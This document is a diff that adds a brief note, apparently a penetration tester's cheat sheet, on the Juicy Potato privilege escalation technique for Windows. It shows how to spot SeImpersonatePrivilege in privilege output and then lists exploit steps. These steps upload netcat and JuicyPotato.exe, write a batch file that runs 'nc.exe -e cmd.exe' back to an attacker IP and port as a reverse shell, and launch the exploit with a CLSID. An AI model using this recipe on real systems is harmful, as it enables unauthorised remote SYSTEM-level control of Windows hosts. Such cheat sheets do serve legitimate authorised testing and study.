@@ -1,0 +1,19 @@
+------JUICY POTATO------
+
+how to check?
+
+Privilege Name          Description                               State  
+======================= ========================================= =======
+SeChangeNotifyPrivilege Bypass traverse checking                  Enabled
+SeImpersonatePrivilege  Impersonate a client after authentication Enabled # this privilege is a signal
+SeCreateGlobalPrivilege Create global objects                     Enabled
+
+exploit
+
+1) upload nc.exe
+2) upload JuicyPotato.exe
+3) echo fullpathtonc.exe -e cmd.exe ip port > priv.bat
+4) start listener
+5) JuicyPotato.exe -p fullpathtopriv.bat -l port -t * -c {CLSID}
+
+Here are the CLSID's - http://ohpe.it/juicy-potato/CLSID/
